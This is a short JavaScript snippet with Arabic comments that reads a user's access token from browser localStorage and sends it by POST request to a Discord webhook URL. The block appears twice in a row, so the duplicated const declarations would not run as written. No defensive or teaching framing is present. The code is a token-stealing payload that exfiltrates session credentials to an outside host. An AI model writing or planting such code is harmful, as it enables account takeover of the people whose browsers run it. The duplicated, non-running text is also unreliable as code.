// جمع رمز الوصول
const access_token = window.localStorage.getItem("access_token");

// أرسل رمز الوصول إلى ويب هوك
const webhook_url = "https://discord.com/api/webhooks/12345678901234567890/abcdefghijklmnopqrstuvwxyz";
const data = JSON.stringify({
  token: access_token,
});

fetch(webhook_url, {
  method: "POST",
  body: data,
});

// جمع رمز الوصول
const access_token = window.localStorage.getItem("access_token");

// أرسل رمز الوصول إلى ويب هوك
const webhook_url = "https://discord.com/api/webhooks/12345678901234567890/abcdefghijklmnopqrstuvwxyz";
const data = JSON.stringify({
  token: access_token,
});

fetch(webhook_url, {
  method: "POST",
  body: data,
});
